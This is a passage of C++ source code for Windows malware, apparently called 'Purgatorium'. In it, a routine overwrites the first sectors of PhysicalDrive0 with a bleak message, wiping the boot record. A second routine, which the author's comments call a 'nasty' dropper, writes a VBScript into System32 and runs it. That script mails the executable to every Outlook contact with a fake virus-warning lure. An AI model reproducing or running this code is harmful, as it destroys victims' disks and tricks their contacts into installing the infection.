			0x77, 0x6E, 0x20, 0x68, 0x65, 0x6C, 0x6C, 0x2E, 0x2E, 0x2E, 0x00, 0x20, 0x20, 0x20, 0x20, 0x20,
			0x53, 0x65, 0x65, 0x6B, 0x69, 0x6E, 0x67, 0x20, 0x6D, 0x65, 0x61, 0x6E, 0x69, 0x6E, 0x67, 0x20,
			0x74, 0x69, 0x6C, 0x6C, 0x20, 0x6D, 0x79, 0x20, 0x64, 0x65, 0x61, 0x74, 0x68, 0x2E, 0x20, 0x20,
			0x20, 0x20, 0x20, 0x00, 0x20, 0x20, 0x20, 0x20, 0x20, 0x57, 0x61, 0x6C, 0x6B, 0x69, 0x6E, 0x67,
			0x20, 0x61, 0x6C, 0x6F, 0x6E, 0x65, 0x20, 0x61, 0x74, 0x20, 0x74, 0x68, 0x65, 0x20, 0x64, 0x61,
			0x72, 0x6B, 0x6E, 0x65, 0x73, 0x73, 0x2E, 0x20, 0x20, 0x20, 0x20, 0x20, 0x00, 0x53, 0x68, 0x61,
			0x64, 0x6F, 0x77, 0x73, 0x20, 0x61, 0x6E, 0x64, 0x20, 0x6C, 0x69, 0x67, 0x68, 0x74, 0x20, 0x69,
			0x6E, 0x74, 0x65, 0x72, 0x74, 0x77, 0x69, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x74, 0x6F, 0x67, 0x65,
			0x74, 0x68, 0x65, 0x72, 0x2E, 0x00, 0x20, 0x48, 0x61, 0x76, 0x69, 0x6E, 0x67, 0x20, 0x6D, 0x79,
			0x20, 0x62, 0x72, 0x61, 0x69, 0x6E, 0x20, 0x6D, 0x65, 0x6C, 0x74, 0x65, 0x64, 0x20, 0x69, 0x6E,
			0x74, 0x6F, 0x20, 0x6E, 0x6F, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x2E, 0x2E, 0x2E, 0x20, 0x00, 0x20,
			0x52, 0x65, 0x70, 0x65, 0x61, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x74, 0x68, 0x65, 0x20, 0x73, 0x61,
			0x6D, 0x65, 0x20, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x20, 0x61, 0x67, 0x61, 0x69, 0x6E, 0x20, 0x66,
			0x6F, 0x72, 0x65, 0x76, 0x65, 0x72, 0x20, 0x00, 0x49, 0x20, 0x67, 0x75, 0x65, 0x73, 0x73, 0x20,
			0x74, 0x68, 0x61, 0x74, 0x20, 0x49, 0x27, 0x6C, 0x6C, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x66, 0x69,
			0x6E, 0x64, 0x20, 0x61, 0x6E, 0x79, 0x20, 0x61, 0x6E, 0x73, 0x77, 0x65, 0x72, 0x73, 0x2E, 0x2E,
			0x00, 0x20, 0x20, 0x20, 0x43, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65, 0x20, 0x63, 0x68, 0x61,
			0x6F, 0x73, 0x2E, 0x2E, 0x2E, 0x20, 0x46, 0x75, 0x6C, 0x6C, 0x20, 0x64, 0x69, 0x73, 0x6F, 0x72,
			0x64, 0x65, 0x72, 0x2E, 0x2E, 0x2E, 0x20, 0x20, 0x20, 0x00, 0x45, 0x76, 0x65, 0x72, 0x79, 0x74,
			0x68, 0x69, 0x6E, 0x67, 0x20, 0x69, 0x73, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72, 0x6F, 0x79, 0x65,
			0x64, 0x2C, 0x20, 0x6E, 0x6F, 0x20, 0x74, 0x75, 0x72, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x62, 0x61,
			0x63, 0x6B, 0x00, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x43, 0x68, 0x61, 0x69, 0x6E, 0x65,
			0x64, 0x20, 0x68, 0x65, 0x72, 0x65, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x65, 0x74, 0x65, 0x72, 0x6E,
			0x69, 0x74, 0x79, 0x2E, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x00, 0x20, 0x20, 0x20, 0x20,
			0x20, 0x20, 0x20, 0x20, 0x20, 0x43, 0x6F, 0x6E, 0x64, 0x65, 0x6D, 0x6E, 0x65, 0x64, 0x20, 0x74,
			0x6F, 0x20, 0x73, 0x75, 0x66, 0x66, 0x65, 0x72, 0x69, 0x6E, 0x67, 0x20, 0x20, 0x20, 0x20, 0x20,
			0x20, 0x20, 0x20, 0x20, 0x00, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x42, 0x65, 0x79, 0x6F, 0x6E,
			0x64, 0x20, 0x74, 0x68, 0x65, 0x20, 0x76, 0x65, 0x69, 0x6C, 0x20, 0x6F, 0x66, 0x20, 0x69, 0x6C,
			0x6C, 0x75, 0x73, 0x69, 0x6F, 0x6E, 0x73, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x00, 0x20, 0x20,
			0x20, 0x20, 0x20, 0x20, 0x4C, 0x69, 0x76, 0x69, 0x6E, 0x67, 0x20, 0x6F, 0x6E, 0x20, 0x74, 0x68,
			0x65, 0x20, 0x76, 0x6F, 0x72, 0x74, 0x65, 0x78, 0x20, 0x6F, 0x66, 0x20, 0x6C, 0x69, 0x66, 0x65,
			0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00
		};

		DWORD dwBytesWritten;

		HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

		//Overwrite the first 6 sectors (3072 bytes) of the drive
		WriteFile(hDrive, Infernum, 3072, &dwBytesWritten, NULL);
		CloseHandle(hDrive);
	}
}

namespace Spread
{
	/*
		 I almost gave up in this part because I tried using MAPI.h
		But it didn't worked, so I did this small VBScript "dropper"
		      It's so nasty ik, but at least it works lmao ^^
	*/

	VOID SpreadEmail(VOID)
	{
		LPCWSTR lpFileName = L"C:\\WINDOWS\\System32\\explorer.vbs";

		const CHAR* lpBuffer = 
		{
			"On Error Resume Next\r\n\r\n"

			"Set sys32 = CreateObject(\"Scripting.FileSystemObject\").GetSpecialFolder(1)\r\n"
			"Set outlook = CreateObject(\"Outlook.Application\")\r\n\r\n"

			"For Each addr In outlook.GetNameSpace(\"MAPI\").AddressLists\r\n\t"
			"If addr.AddressEntries.Count <> 0 Then\r\n\t\t"
			"addrEntCount = addr.AddressEntries.Count\r\n\t\t"
			"For addrEntIndex = 1 To addrEntCount\r\n\t\t\t"

			"Set item = outlook.CreateItem(0)\r\n\r\n\t\t\t"
			"item.To = addr.AddressEntries(addrEntIndex).Address\r\n\t\t\t"
			"item.Subject = \"THE END IS NEAR!!!\"\r\n\t\t\t"
			"item.Body = \"There is a very malicious virus that has spread to almost 90 % of the computers in the world.\" & vbcrlf & vbcrlf & \"This malicious software has the ability to spy your system and collect personal data! Therefore, to contain the infection and remove the virus from your computer, install the attached program.\"\r\n\t\t\t"
			"item.attachMents.Add(sys32& \"\\Purgatorium.exe\")\r\n\t\t\t"
			"item.DeleteAfterSubmit = True\r\n\r\n\t\t\t"

			"If item.to <> \"\" Then\r\n\t\t\t\t"
			"item.Send\r\n\t\t\t"
			"End If\r\n\t\t"
			"Next\r\n\t"
			"End If\r\n"
			"Next"
		};

		//First, it creates the file
		HANDLE hFile = CreateFileW(lpFileName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	
		DWORD dwBytesWritten;

		//Write our MAPI script in the file
		WriteFile(hFile, lpBuffer, strlen(lpBuffer), &dwBytesWritten, NULL);

		CloseHandle(hFile);

		//Execute the script
		ShellExecuteW(NULL, L"open", L"wscript.exe", lpFileName, NULL, NULL);
	}
}
